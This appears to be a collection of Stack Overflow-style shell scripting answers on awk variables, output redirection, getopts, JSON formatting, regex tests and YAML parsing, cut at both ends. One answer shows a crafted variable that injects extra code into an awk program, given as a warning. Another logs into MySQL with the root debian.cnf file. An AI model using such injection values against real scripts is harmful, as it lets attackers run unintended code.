backslashes treated literally by using shell parameter substitution to escape any backslashes:\n$ awk -v var=\"${variable//\\\\/\\\\\\\\}\" 'BEGIN{ printf \"%s\\n\", var }'\na\\tb\\n$c\\kd\nor by using ENVIRON[] or access it via ARGV[] (see below).\nYou cannot use -v var=\"$(printf '%q' \"$variable\")\" for this as that would also escape $s, nor can you use -v var=\"${variable@Q}\" as that would just add 's around \"$variable\" and the escape sequences would still be interpreted by awk. That's because those 2 approaches both escape chars according to shell syntax for providing command input, not awk syntax for assigning strings to variables.\nPS If you have vertical bar or other regexp meta characters as separator like |?( etc, they must be double escaped. Example 3 vertical bars ||| becomes -F'\\\\|\\\\|\\\\|'. You can also use -F\"[|][|][|]\".\nExample on getting data from a program/function in to awk (here date is used)\nawk -v time=\"$(date +\"%F %H:%M\" -d '-1 minute')\" 'BEGIN {print time}'\nExample of testing the contents of a shell variable as a regexp:\nawk -v var=\"$variable\" '$0 ~ var{print \"found it\"}'\nVariable after code block\nHere we get the variable after the awk code. This will work fine as long as you do not need the variable in the BEGIN block:\nvariable=\"line one\\nline two\"\necho \"input data\" | awk '{print var}' var=\"${variable}\"\nor\nawk '{print var}' var=\"${variable}\" file\nAdding multiple variables:\nawk '{print a,b,$0}' a=\"$var1\" b=\"$var2\" file\nIn this way we can also set different Field Separator FS for each file.\nawk 'some code' FS=',' file1.txt FS=';' file2.ext\nVariable after the code block will not work for the BEGIN block:\necho \"input data\" | awk 'BEGIN {print var}' var=\"${variable}\"\nHere-string\nVariable can also be added to awk using a here-string from shells that support them (including Bash):\nawk '{print $0}' <<< \"$variable\"\ntest\nThis is the same as:\necho \"$variable\" | awk '{print $0}'\nprintf '%s' \"$variable\" | awk '{print $0}'\nP.S. this treats the variable as a file input.\nENVIRON input\nAs TrueY writes, you can use the ENVIRON to print Environment Variables. Setting a variable before running AWK, you can print it out like this:\nexport X=MyVar\nawk 'BEGIN{print ENVIRON[\"X\"],ENVIRON[\"SHELL\"]}'\nMyVar /bin/bash\nor for a non-exported variable:\nx=MyVar\nx=\"$x\" awk 'BEGIN{print ENVIRON[\"x\"],ENVIRON[\"SHELL\"]}'\nMyVar /bin/bash\nARGV input\nAs Steven Penny writes, you can use ARGV to get the data into awk:\nv=\"my data\"\nawk 'BEGIN {print ARGV[1]}' \"$v\"\nmy data\nTo get the data into the code itself, not just the BEGIN:\nv=\"my data\"\necho \"test\" | awk 'BEGIN{var=ARGV[1];ARGV[1]=\"\"} {print var, $0}' \"$v\"\nmy data test\nVariable within the code: USE WITH CAUTION\nYou can use a variable within the awk code, but it's messy and hard to read, and as Charles Duffy points out, this version may also be a victim of code injection. If someone adds bad stuff to the variable, it will be executed as part of the awk code.\nThis works by extracting the variable within the code, so it becomes a part of it.\nIf you want to make an awk that changes dynamically with use of variables, you can do it this way, but DO NOT use it for normal variables.\nvariable=\"line one\\nline two\"\nawk 'BEGIN {print \"'\"$variable\"'\"}'\nline one\nline two\nHere is an example of code injection:\nvariable='line one\\nline two\" ; for (i=1;i<=1000;++i) print i\"'\nawk 'BEGIN {print \"'\"$variable\"'\"}'\nline one\nline two\n1\n2\n3\n.\n.\n1000\nYou can add lots of commands to awk this way. Even make it crash with non valid commands.\nOne valid use of this approach, though, is when you want to pass a symbol to awk to be applied to some input, e.g. a simple calculator:\n$ calc() { awk -v x=\"$1\" -v z=\"$3\" 'BEGIN{ print x '\"$2\"' z }'; }\n\n$ calc 2.7 '+' 3.4\n6.1\n\n$ calc 2.7 '*' 3.4\n9.18\nThere is no way to do that using an awk variable populated with the value of a shell variable, you NEED the shell variable to expand to become part of the text of the awk script before awk interprets it. (see comment below by Ed M.)\nExtra info:\nUse of double quote\nIt's always good to double quote variable \"$variable\"\nIf not, multiple lines will be added as a long single line.\nExample:\nvar=\"Line one\nThis is line two\"\n\necho $var\nLine one This is line two\n\necho \"$var\"\nLine one\nThis is line two\nOther errors you can get without double quote:\nvariable=\"line one\\nline two\"\nawk -v var=$variable 'BEGIN {print var}'\nawk: cmd. line:1: one\\nline\nawk: cmd. line:1:    ^ backslash not last character on line\nawk: cmd. line:1: one\\nline\nawk: cmd. line:1:    ^ syntax error\nAnd with single quote, it does not expand the value of the variable:\nawk -v var='$variable' 'BEGIN {print var}'\n$variable\nMore info about AWK and variables\nRead this faq.",
    "How can I suppress all output from a command using Bash?": "The following sends standard output to the null device (bit bucket).\nscriptname >/dev/null\nAnd if you also want error messages to be sent there, use one of (the first may not work in all shells):\nscriptname &>/dev/null\nscriptname >/dev/null 2>&1\nscriptname >/dev/null 2>/dev/null\nAnd, if you want to record the messages, but not see them, replace /dev/null with an actual file, such as:\nscriptname &>scriptname.out\nFor completeness, under Windows cmd.exe (where \"nul\" is the equivalent of \"/dev/null\"), it is:\nscriptname >nul 2>nul",
    "How to get arguments with flags in Bash": "This example uses Bash's built-in getopts command and is from the Google Shell Style Guide:\na_flag=''\nb_flag=''\nfiles=''\nverbose='false'\n\nprint_usage() {\n  printf \"Usage: ...\"\n}\n\nwhile getopts 'abf:v' flag; do\n  case \"${flag}\" in\n    a) a_flag='true' ;;\n    b) b_flag='true' ;;\n    f) files=\"${OPTARG}\" ;;\n    v) verbose='true' ;;\n    *) print_usage\n       exit 1 ;;\n  esac\ndone\nNote: If a character is followed by a colon (e.g. f:), that option is expected to have an argument.\nExample usage: ./script -v -a -b -f filename\nUsing getopts has several advantages over the accepted answer:\nthe while condition is a lot more readable and shows what the accepted options are\ncleaner code; no counting the number of parameters and shifting\nyou can join options (e.g. -a -b -c \u2192 -abc)\nHowever, a big disadvantage is that it doesn't support long options, only single-character options.",
    "Suppress warning messages using mysql from within Terminal, but password written in bash script": "I use something like:\nmysql --defaults-extra-file=/path/to/config.cnf\nor\nmysqldump --defaults-extra-file=/path/to/config.cnf \nWhere config.cnf contains:\n[client]\nuser = \"whatever\"\npassword = \"whatever\"\nhost = \"whatever\"\nThis allows you to have multiple config files - for different servers/roles/databases. Using ~/.my.cnf will only allow you to have one set of configuration (although it may be a useful set of defaults).\nIf you're on a Debian based distro, and running as root, you could skip the above and just use /etc/mysql/debian.cnf to get in ... :\nmysql --defaults-extra-file=/etc/mysql/debian.cnf",
    "How do I set tmux to open specified windows at startup?": "You can write a small shell script that launches tmux with the required programs. I have the following in a shell script that I call dev-tmux. A dev environment:\n#!/bin/sh\ntmux new-session -d 'vim'\ntmux split-window -v 'ipython'\ntmux split-window -h\ntmux new-window 'mutt'\ntmux -2 attach-session -d\nSo everytime I want to launch my favorite dev environment I can just do\n$ dev-tmux",
    "How to view files in binary from bash?": "xxd does both binary and hexadecimal.\nbin:\nxxd -b file\nhex:\nxxd file",
    "Display curl output in readable JSON format in Unix shell script": "A few solutions to choose from:\njson json is a fast CLI tool for working with JSON. It is a single-file node.js script with no external deps (other than node.js itself).\n$ echo '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | json\n{\n  \"type\": \"Bar\",\n  \"id\": \"1\",\n  \"title\": \"Foo\"\n}\nRequire:\n# npm install -g json\njson_pp: command utility available in Linux systems for JSON decoding/encoding\necho '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | json_pp -json_opt pretty,canonical\n{\n   \"id\" : \"1\",\n   \"title\" : \"Foo\",\n   \"type\" : \"Bar\"\n}\nYou may want to keep the -json_opt pretty,canonical argument for predictable ordering.\njq\n: lightweight and flexible command-line JSON processor. It is written in portable C, and it has zero runtime dependencies.\necho '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | jq '.'\n{\n  \"type\": \"Bar\",\n  \"id\": \"1\",\n  \"title\": \"Foo\"\n}\nThe simplest jq program is the expression ., which takes the input and produces it unchanged as output.\nFor additional jq options check the manual\npython yq yq: Command-line YAML/XML/TOML processor - jq wrapper for YAML, XML, TOML documents\n$ echo '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | yq\n{\n  \"type\": \"Bar\",\n  \"id\": \"1\",\n  \"title\": \"Foo\"\n}\nThe\ngo\nversion go yq doesn't work here\nWith xidel Command line tool to download and extract data from HTML/XML pages or JSON-APIs, using CSS, XPath 3.0, XQuery 3.0, JSONiq or pattern matching. It can also create new or transformed XML/HTML/JSON documents.\n$ echo '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | xidel -e '$json'\n{\n  \"type\": \"Bar\",\n  \"id\": \"1\",\n  \"title\": \"Foo\"\n}\nwith\npython\n:\necho '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | python -m json.tool\n{\n    \"id\": \"1\",\n    \"title\": \"Foo\",\n    \"type\": \"Bar\"\n}\nwith\nnodejs\nand\nbash\n:\necho '{\"type\":\"Bar\",\"id\":\"1\",\"title\":\"Foo\"}' | node -p \"JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )\"\n{\n \"type\": \"Bar\",\n \"id\": \"1\",\n \"title\": \"Foo\"\n}",
    "Is PowerShell ready to replace my Cygwin shell on Windows? [closed]": "Tools are just tools.\nThey help or they don't.\nYou need help or you don't.\nIf you know Unix and those tools do what you need them to do on Windows - then you are a happy guy and there is no need to learn PowerShell (unless you want to explore).\nMy original intent was to include a set of Unix tools in Windows and be done with it (a number of us on the team have deep Unix backgrounds and a healthy dose of respect for that community.)\nWhat I found was that this didn't really help much. The reason for that is that AWK/grep/sed don't work against COM, WMI, ADSI, the Registry, the certificate store, etc., etc.\nIn other words, UNIX is an entire ecosystem self-tuned around text files. As such, text processing tools are effectively management tools. Windows is a completely different ecosystem self-tuned around APIs and Objects. That's why we invented PowerShell.\nWhat I think you'll find is that there will be lots of occasions when text-processing won't get you what you want on Windows. At that point, you'll want to pick up PowerShell. NOTE - it is not an all or nothing deal. Within PowerShell, you can call out to your Unix tools (and use their text process or PowerShell's text processing). Also you can call PowerShell from your Unix tools and get text.\nAgain - there is no religion here - our focus is on giving you the tools you need to succeed. That is why we are so passionate about feedback. Let us know where we are falling down on the job or where you don't have a tool you need and we'll put it on the list and get to it.\nIn all honesty, we are digging ourselves out of a 30-year-hole, so it is going to take a while. That said, if you pick up the beta of Windows Server 2008 /R2 and/or the betas of our server products, I think you'll be shocked at how quickly that hole is getting filled.\nWith regard to usage - we've had > 3.5 million downloads to date. That does not include the people using it in Windows Server 2008, because it is included as an optional component and does not need a download.\nV2 will ship in all versions of Windows. It will be on-by-default for all editions except Server core where it is an optional component. Shortly after Windows 7/Windows Server 2008 R2 ships, we'll make V2 available on all platforms, Windows XP and above. In other words - your investment in learning will be applicable to a very large number of machines/environments.\nOne last comment. If/when you start to learn PowerShell, I think you'll be pretty happy. Much of the design is heavily influenced by our Unix backgrounds, so while we are quite different, you'll pick it up very quickly (after you get over cussing that it isn't Unix :-) ).\nWe know that people have a very limited budget for learning - that is why we are super hard-core about consistency. You are going to learn something, and then you'll use it over and over and over again.\nExperiment! Enjoy! Engage!",
    "How can I use inverse or negative wildcards when pattern matching in a unix/linux shell?": "In Bash you can do it by enabling the extglob option, like this (replace ls with cp and add the target directory, of course)\n~/foobar> shopt extglob\nextglob        off\n~/foobar> ls\nabar  afoo  bbar  bfoo\n~/foobar> ls !(b*)\n-bash: !: event not found\n~/foobar> shopt -s extglob  # Enables extglob\n~/foobar> ls !(b*)\nabar  afoo\n~/foobar> ls !(a*)\nbbar  bfoo\n~/foobar> ls !(*foo)\nabar  bbar\nYou can later disable extglob with\nshopt -u extglob",
    "Test if a command outputs an empty string": "Previously, the question asked how to check whether there are files in a directory. The following code achieves that, but see rsp's answer for a better solution.\nEmpty output\nCommands don\u2019t return values \u2013 they output them. You can capture this output by using command substitution; e.g. $(ls -A). You can test for a non-empty string in Bash like this:\nif [[ $(ls -A) ]]; then\n    echo \"there are files\"\nelse\n    echo \"no files found\"\nfi\nNote that I've used -A rather than -a, since it omits the symbolic current (.) and parent (..) directory entries.\nNote: As pointed out in the comments, command substitution doesn't capture trailing newlines. Therefore, if the command outputs only newlines, the substitution will capture nothing and the test will return false. While very unlikely, this is possible in the above example, since a single newline is a valid filename! More information in this answer.\nExit code\nIf you want to check that the command completed successfully, you can inspect $?, which contains the exit code of the last command (zero for success, non-zero for failure). For example:\nfiles=$(ls -A)\nif [[ $? != 0 ]]; then\n    echo \"Command failed.\"\nelif [[ $files ]]; then\n    echo \"Files found.\"\nelse\n    echo \"No files found.\"\nfi\nMore info here.",
    "How to assign the output of a command to a Makefile variable": "Use the Make shell builtin like in MY_VAR=$(shell echo whatever)\nme@Zack:~$make\nMY_VAR IS whatever\nme@Zack:~$ cat Makefile \nMY_VAR := $(shell echo whatever)\n\nall:\n    @echo MY_VAR IS $(MY_VAR)",
    "How to change the default shell in Linux? [closed]": "Try linux command chsh.\nThe detailed command is chsh -s /bin/bash. It will prompt you to enter your password. Your default login shell is /bin/bash now. You must log out and log back in to see this change.\nThe following is quoted from man page:\nThe chsh command changes the user login shell. This determines the name of the users initial login command. A normal user may only change the login shell for her own account, the superuser may change the login shell for any account\nThis command will change the default login shell permanently.\nNote: If your user account is remote such as on Kerberos authentication (e.g. Enterprise RHEL) then you will not be able to use chsh.",
    "Test if remote TCP port is open from a shell script": "As pointed by B. Rhodes, nc (netcat) will do the job. A more compact way to use it:\nnc -z <host> <port>\nThat way nc will only check if the port is open, exiting with 0 on success, 1 on failure.\nFor a quick interactive check (with a 5 seconds timeout):\nnc -z -v -w5 <host> <port>",
    "Check if a string matches a regex in Bash script": "You can use the test construct, [[ ]], along with the regular expression match operator, =~, to check if a string matches a regex pattern (documentation).\nFor your specific case, you can write:\n[[ \"$date\" =~ ^[0-9]{8}$ ]] && echo \"yes\"\nOr more a accurate test:\n[[ \"$date\" =~ ^[0-9]{4}(0[1-9]|1[0-2])(0[1-9]|[1-2][0-9]|3[0-1])$ ]] && echo \"yes\"\n#             |\\______/\\______*______/\\______*__________*______/|\n#             |   |           |                  |              |\n#             |   |           |                  |              |\n#             | --year--   --month--           --day--          |\n#             |          either 01...09      either 01..09      |\n#      start of line         or 10,11,12         or 10..29      |\n#                                                or 30, 31      |\n#                                                          end of line\nThat is, you can define a regex in Bash matching the format you want. This way you can do:\n[[ \"$date\" =~ ^regex$ ]] && echo \"matched\" || echo \"did not match\"\nwhere commands after && are executed if the test is successful, and commands after || are executed if the test is unsuccessful.\nNote this is based on the solution by Aleks-Daniel Jakimenko in User input date format verification in bash.\nIn other shells you can use grep. If your shell is POSIX compliant, do\n(echo \"$date\" | grep -Eq  ^regex$) && echo \"matched\" || echo \"did not match\"\nIn fish, which is not POSIX-compliant, you can do\necho \"$date\" | grep -Eq \"^regex\\$\"; and echo \"matched\"; or echo \"did not match\"\nCaveat: These portable grep solutions are not water-proof! For example, they can be tricked by input parameters that contain newlines. The first mentioned bash-specific regex check does not have this issue.",
    "What does $@ mean in a shell script?": "$@ is all of the parameters passed to the script.\nFor instance, if you call ./someScript.sh foo bar then $@ will be equal to foo bar.\nIf you do:\n./someScript.sh foo bar\nand then inside someScript.sh reference:\numbrella_corp_options \"$@\"\nthis will be passed to umbrella_corp_options with each individual parameter enclosed in double quotes, allowing to take parameters with blank space from the caller and pass them on.",
    "Exit Shell Script Based on Process Exit Code [duplicate]": "After each command, the exit code can be found in the $? variable so you would have something like:\nls -al file.ext\nrc=$?; if [[ $rc != 0 ]]; then exit $rc; fi\nYou need to be careful of piped commands since the $? only gives you the return code of the last element in the pipe so, in the code:\nls -al file.ext | sed 's/^/xx: /\"\nwill not return an error code if the file doesn't exist (since the sed part of the pipeline actually works, returning 0).\nThe bash shell actually provides an array which can assist in that case, that being PIPESTATUS. This array has one element for each of the pipeline components, that you can access individually like ${PIPESTATUS[0]}:\npax> false | true ; echo ${PIPESTATUS[0]}\n1\nNote that this is getting you the result of the false command, not the entire pipeline. You can also get the entire list to process as you see fit:\npax> false | true | false; echo ${PIPESTATUS[*]}\n1 0 1\nIf you wanted to get the largest error code from a pipeline, you could use something like:\ntrue | true | false | true | false\nrcs=${PIPESTATUS[*]}; rc=0; for i in ${rcs}; do rc=$(($i > $rc ? $i : $rc)); done\necho $rc\nThis goes through each of the PIPESTATUS elements in turn, storing it in rc if it was greater than the previous rc value.",
    "Select random lines from a file": "Use shuf with the -n option as shown below, to get N random lines:\nshuf -n N input > output",
    "Is there a \"standard\" format for command line/shell help text?": "Typically, your help output should include:\nDescription of what the app does\nUsage syntax, which:\nUses [options] to indicate where the options go\narg_name for a required, singular arg\n[arg_name] for an optional, singular arg\narg_name... for a required arg of which there can be many (this is rare)\n[arg_name...] for an arg for which any number can be supplied\nnote that arg_name should be a descriptive, short name, in lower, snake case\nA nicely-formatted list of options, each:\nhaving a short description\nshowing the default value, if there is one\nshowing the possible values, if that applies\nNote that if an option can accept a short form (e.g. -l) or a long form (e.g. --list), include them together on the same line, as their descriptions will be the same\nBrief indicator of the location of config files or environment variables that might be the source of command line arguments, e.g. GREP_OPTS\nIf there is a man page, indicate as such, otherwise, a brief indicator of where more detailed help can be found\nNote further that it's good form to accept both -h and --help to trigger this message and that you should show this message if the user messes up the command-line syntax, e.g. omits a required argument.",
    "How to only get file name with Linux 'find'?": "In GNU find you can use -printf parameter for that, e.g.:\nfind /dir1 -type f -printf \"%f\\n\"",
    "Convert absolute path into relative path given a current directory using Bash": "Using realpath from GNU coreutils 8.23 is the simplest, I think:\n$ realpath -s --relative-to=\"$file1\" \"$file2\"\nFor example:\n$ realpath -s --relative-to=/usr/bin/nmap /tmp/testing\n../../../tmp/testing\nThe -s flag ensures that symlinks are not expanded.",
    "Generating a SHA-256 hash from the Linux command line": "echo will normally output a newline, which is suppressed with -n. Try this:\necho -n foobar | sha256sum",
    "\"unary operator expected\" error in Bash if condition": "If you know you're always going to use Bash, it's much easier to always use the double bracket conditional compound command [[ ... ]], instead of the POSIX-compatible single bracket version [ ... ]. Inside a [[ ... ]] compound, word-splitting and pathname expansion are not applied to words, so you can rely on\nif [[ $aug1 == \"and\" ]];\nto compare the value of $aug1 with the string and.\nIf you use [ ... ], you always need to remember to double quote variables like this:\nif [ \"$aug1\" = \"and\" ];\nIf you don't quote the variable expansion and the variable is undefined or empty, it vanishes from the scene of the crime, leaving only\nif [ = \"and\" ];\nwhich is not a valid syntax. (It would also fail with a different error message if $aug1 included white space or shell metacharacters.)\nThe modern [[ operator has lots of other nice features, including regular expression matching.",
    "Difference between wait and sleep": "wait waits for a process to finish; sleep sleeps for a certain amount of seconds.",
    "shell script to remove a file if it already exist": "Don't bother checking if the file exists, just try to remove it.\nrm -f /p/a/t/h\n# or\nrm /p/a/t/h 2> /dev/null\nNote that the second command will fail (return a non-zero exit status) if the file did not exist, but the first will succeed owing to the -f (short for --force) option. Depending on the situation, this may be an important detail.\nBut more likely, if you are appending to the file it is because your script is using >> to redirect something into the file. Just replace >> with >. It's hard to say since you've provided no code.\nNote that you can do something like test -f /p/a/t/h && rm /p/a/t/h, but doing so is completely pointless. It is quite possible that the test will return true but the /p/a/t/h will fail to exist before you try to remove it, or worse the test will fail and the /p/a/t/h will be created before you execute the next command which expects it to not exist. Attempting this is a classic race condition. Don't do it.",
    "How to find whether or not a variable is empty in Bash": "In Bash at least the following command tests if $var is empty:\nif [[ -z \"$var\" ]]; then\n   # $var is empty, do what you want\nfi\nThe command man test is your friend.",
    "Shell equality operators (=, ==, -eq)": "= and == are for string comparisons\n-eq is for numeric comparisons\n-eq is in the same family as -lt, -le, -gt, -ge, and -ne\n== is specific to bash (not present in sh (Bourne shell), ...). Using POSIX = is preferred for compatibility. In bash the two are equivalent, and in sh = is the only one that will work.\n$ a=foo\n$ [ \"$a\" = foo ]; echo \"$?\"       # POSIX sh\n0\n$ [ \"$a\" == foo ]; echo \"$?\"      # bash-specific\n0\n$ [ \"$a\" -eq foo ]; echo \"$?\"     # wrong\n-bash: [: foo: integer expression expected\n2\n(Note: make sure to quote the variable expansions. Do not leave out the double-quotes above.)\nIf you're writing a #!/bin/bash script then I recommend using [[ instead. The double square-brackets [[...]] form has more features, a more natural syntax, and fewer gotchas that will trip you up. For example, double quotes are no longer required around $a:\n$ [[ $a == foo ]]; echo \"$?\"      # bash-specific\n0\nSee also:\nWhat's the difference between [ and [[ in Bash?",
    "Running script upon login in mac OS X [closed]": "Follow this:\nstart Automator.app\nselect Application\nclick Show library in the toolbar (if hidden)\nadd Run shell script (from the Actions/Utilities)\ncopy & paste your script into the window\ntest it\nsave somewhere (for example you can make an Applications folder in your HOME, you will get an your_name.app)\ngo to System Preferences -> Users & Groups -> Login items (or System Preferences -> Accounts -> Login items / depending of your MacOS version)\nadd this app\ntest & done ;)\nEDIT:\nI've recently earned a \"Good answer\" badge for this answer. While my solution is simple and working, the cleanest way to run any program or shell script at login time is described in @trisweb's answer, unless, you want interactivity.\nWith automator solution you can do things like next:\nso, asking to run a script or quit the app, asking passwords, running other automator workflows at login time, conditionally run applications at login time and so on...",
    "How to search and replace using grep": "Another option is to use find and then pass it through sed.\nfind /path/to/files -type f -exec sed -i 's/oldstring/new string/g' {} \\;",
    "Open and write data to text file using Bash?": "The short answer:\necho \"some data for the file\" >> fileName\nHowever, echo doesn't deal with end of line characters (EOFs) in an ideal way. So, if you're going to append more than one line, do it with printf:\nprintf \"some data for the file\\nAnd a new line\" >> fileName\nThe >> and > operators are very useful for redirecting output of commands, they work with multiple other bash commands.",
    "How can I repeat a character in Bash?": "You can use:\nprintf '=%.0s' {1..100}\nHow this works:\nBash expands {1..100} so the command becomes:\nprintf '=%.0s' 1 2 3 4 ... 100\nI've set printf's format to =%.0s which means that it will always print a single = no matter what argument it is given. Therefore it prints 100 =s.\nNB: To print 100 dashes you need to escape the format string\nprintf -- '-%0.s' {1..100}\nso that the dash is not interpreted as an option.",
    "Get last dirname/filename in a file path argument in Bash": "basename does remove the directory prefix of a path:\n$ basename /usr/local/svn/repos/example\nexample\n$ echo \"/server/root/$(basename /usr/local/svn/repos/example)\"\n/server/root/example",
    "How to split one string into multiple strings separated by at least one space in bash shell?": "I like the conversion to an array, to be able to access individual elements:\nsentence=\"this is a story\"\nstringarray=($sentence)\nnow you can access individual elements directly (it starts with 0):\necho ${stringarray[0]}\nor convert back to string in order to loop:\nfor i in \"${stringarray[@]}\"\ndo\n  :\n  # do whatever on $i\ndone\nOf course looping through the string directly was answered before, but that answer had the the disadvantage to not keep track of the individual elements for later use:\nfor i in $sentence\ndo\n  :\n  # do whatever on $i\ndone\nSee also Bash Array Reference.",
    "in mac always getting zsh: command not found: [closed]": "It's evident that you've managed to mess up your PATH variable. (Your current PATH doesn't contain any location where common utilities are located.)\nTry:\nPATH=/bin:/usr/bin:/usr/local/bin:/sbin:${PATH}\nexport PATH\nAlternatively, for \"resetting\" zsh, specify the complete path to the shell:\nexec /bin/zsh\nor\nexec /usr/bin/zsh",
    "How can I parse a YAML file from a Linux shell script?": "Here is a bash-only parser that leverages sed and awk to parse simple yaml files:\nfunction parse_yaml {\n   local prefix=$2\n   local s='[[:space:]]*' w='[a-zA-Z0-9_]*' fs=$(echo @|tr @ '\\034')\n   sed -ne \"s|^\\($s\\):|\\1|\" \\\n        -e \"s|^\\($s\\)\\($w\\)$s:$s[\\\"']\\(.*\\)[\\\"']$s\\$|\\1$fs\\2$fs\\3|p\" \\\n        -e \"s|^\\($s\\)\\($w\\)$s:$s\\(.*\\)$s\\$|\\1$fs\\2$fs\\3|p\"  $1 |\n   awk -F$fs '{\n      indent = length($1)/2;\n      vname[indent] = $2;\n      for (i in vname) {if (i > indent) {delete vname[i]}}\n      if (length($3) > 0) {\n         vn=\"\"; for (i=0; i<indent; i++) {vn=(vn)(vname[i])(\"_\")}\n         printf(\"%s%s%s=\\\"%s\\\"\\n\", \"'$prefix'\",vn, $2, $3);\n      }\n   }'\n}\nIt understands files such as:\n## global definitions\nglobal:\n  debug: yes\n  verbose: no\n  debugging:\n    detailed: no\n    header: \"debugging started\"\n\n## output\noutput:\n   file: \"yes\"\nWhich, when parsed using:\nparse_yaml sample.yml\nwill output:\nglobal_debug=\"yes\"\nglobal_verbose=\"no\"\nglobal_debugging_detailed=\"no\"\nglobal_debugging_header=\"debugging started\"\noutput_file=\"yes\"\nit also understands yaml files, generated by ruby which may include ruby symbols, like:\n---\n:global:\n  :debug: 'yes'\n  :verbose: 'no'\n  :debugging:\n    :detailed: 'no'\n    :header: debugging started\n  :output: 'yes'\nand will output the same as in the previous example.\ntypical use within a script is:\neval $(parse_yaml sample.yml)\nparse_yaml accepts a prefix argument so that imported settings all have a common prefix (which will reduce the risk of namespace collisions).\nparse_yaml sample.yml \"CONF_\"\nyields:\nCONF_global_debug=\"yes\"\nCONF_global_verbose=\"no\"\nCONF_global_debugging_detailed=\"no\"\nCONF_global_debugging_header=\"debugging started\"\nCONF_output_file=\"yes\"\nNote that previous settings in a file can be referred to by later settings:\n## global definitions\nglobal:\n  debug: yes\n  verbose: no\n  debugging:\n    detailed: no\n    header: \"debugging started\"\n\n## output\noutput:\n   debug: $global_debug\nAnother nice usage is to first parse a defaults file and then the user settings, which works since the latter settings overrides the first ones:\neval $(parse_yaml defaults.yml)\neval $(parse_yaml project.yml)",
    "Block Comments in a Shell Script": "In bash:\n#!/bin/bash\necho before comment\n: <<'END'\nbla bla\nblurfl\nEND\necho after comment\nThe ' and ' around the END delimiter are important, otherwise things inside the block like for example $(command) will be parsed and executed.\nFor an explanation, see this and this question.",
    "How can I detect if my shell script is running through a pipe?": "In a pure POSIX shell,\nif [ -t 1 ] ; then echo terminal; else echo \"not a terminal\"; fi\nreturns \"terminal\", because the output is sent to your terminal, whereas\n(if [ -t 1 ] ; then echo terminal; else echo \"not a terminal\"; fi) | cat\nreturns \"not a terminal\", because the output of the parenthetic element is piped to cat.\nThe -t flag is described in man pages as\n-t fd True if file descriptor fd is open and refers to a terminal.\n... where fd can be one of the usual file descriptor assignments:\n0: standard input\n1: standard output\n2: standard error",
    "Why are scripting languages (e.g. Perl, Python, and Ruby) not suitable as shell languages? [closed]": "There are a couple of differences that I can think of; just thoughtstreaming here, in no particular order:\nPython & Co. are designed to be good at scripting. Bash & Co. are designed to be only good at scripting, with absolutely no compromise. IOW: Python is designed to be good both at scripting and non-scripting, Bash cares only about scripting.\nBash & Co. are untyped, Python & Co. are strongly typed, which means that the number 123, the string 123 and the file 123 are quite different. They are, however, not statically typed, which means they need to have different literals for those, in order to keep them apart.\nExample:\n                | Ruby             | Bash    \n-----------------------------------------\nnumber          | 123              | 123\nstring          | '123'            | 123\nregexp          | /123/            | 123\nfile            | File.open('123') | 123\nfile descriptor | IO.open('123')   | 123\nURI             | URI.parse('123') | 123\ncommand         | `123`            | 123\nPython & Co. are designed to scale up to 10000, 100000, maybe even 1000000 line programs, Bash & Co. are designed to scale down to 10 character programs.\nIn Bash & Co., files, directories, file descriptors, processes are all first-class objects, in Python, only Python objects are first-class, if you want to manipulate files, directories etc., you have to wrap them in a Python object first.\nShell programming is basically dataflow programming. Nobody realizes that, not even the people who write shells, but it turns out that shells are quite good at that, and general-purpose languages not so much. In the general-purpose programming world, dataflow seems to be mostly viewed as a concurrency model, not so much as a programming paradigm.\nI have the feeling that trying to address these points by bolting features or DSLs onto a general-purpose programming language doesn't work. At least, I have yet to see a convincing implementation of it. There is RuSH (Ruby shell), which tries to implement a shell in Ruby, there is rush, which is an internal DSL for shell programming in Ruby, there is Hotwire, which is a Python shell, but IMO none of those come even close to competing with Bash, Zsh, fish and friends.\nActually, IMHO, the best current shell is Microsoft PowerShell, which is very surprising considering that for several decades now, Microsoft has continually had the worst shells evar. I mean, COMMAND.COM? Really? (Unfortunately, they still have a crappy terminal. It's still the \"command prompt\" that has been around since, what? Windows 3.0?)\nPowerShell was basically created by ignoring everything Microsoft has ever done (COMMAND.COM, CMD.EXE, VBScript, JScript) and instead starting from the Unix shell, then removing all backwards-compatibility cruft (like backticks for command substitution) and massaging it a bit to make it more Windows-friendly (like using the now unused backtick as an escape character instead of the backslash which is the path component separator character in Windows). After that, is when the magic happens.\nThey address problem 1 and 3 from above, by basically making the opposite choice compared to Python. Python cares about large programs first, scripting second. Bash cares only about scripting. PowerShell cares about scripting first, large programs second. A defining moment for me was watching a video of an interview with Jeffrey Snover (PowerShell's lead designer), when the interviewer asked him how big of a program one could write with PowerShell and Snover answered without missing a beat: \"80 characters.\" At that moment I realized that this is finally a guy at Microsoft who \"gets\" shell programming (probably related to the fact that PowerShell was neither developed by Microsoft's programming language group (i.e. lambda-calculus math nerds) nor the OS group (kernel nerds) but rather the server group (i.e. sysadmins who actually use shells)), and that I should probably take a serious look at PowerShell.\nNumber 2 is solved by having arguments be statically typed. So, you can write just 123 and PowerShell knows whether it is a string or a number or a file, because the cmdlet (which is what shell commands are called in PowerShell) declares the types of its arguments to the shell. This has pretty deep ramifications: unlike Unix, where each command is responsible for parsing its own arguments (the shell basically passes the arguments as an array of strings), argument parsing in PowerShell is done by the shell. The cmdlets specify all their options and flags and arguments, as well as their types and names and documentation(!) to the shell, which then can perform argument parsing, tab completion, IntelliSense, inline documentation popups etc. in one centralized place. (This is not revolutionary, and the PowerShell designers acknowledge shells like the DIGITAL Command Language (DCL) and the IBM OS/400 Command Language (CL) as prior art. For anyone who has ever used an AS/400, this should sound familiar. In OS/400, you can write a shell command and if you don't know the syntax of certain arguments, you can simply leave them out and hit F4, which will bring a menu (similar to an HTML form) with labelled fields, dropdown, help texts etc. This is only possible because the OS knows about all the possible arguments and their types.) In the Unix shell, this information is often duplicated three times: in the argument parsing code in the command itself, in the bash-completion script for tab-completion and in the manpage.\nNumber 4 is solved by the fact that PowerShell operates on strongly typed objects, which includes stuff like files, processes, folders and so on.\nNumber 5 is particularly interesting, because PowerShell is the only shell I know of, where the people who wrote it were actually aware of the fact that shells are essentially dataflow engines and deliberately implemented it as a dataflow engine.\nAnother nice thing about PowerShell are the naming 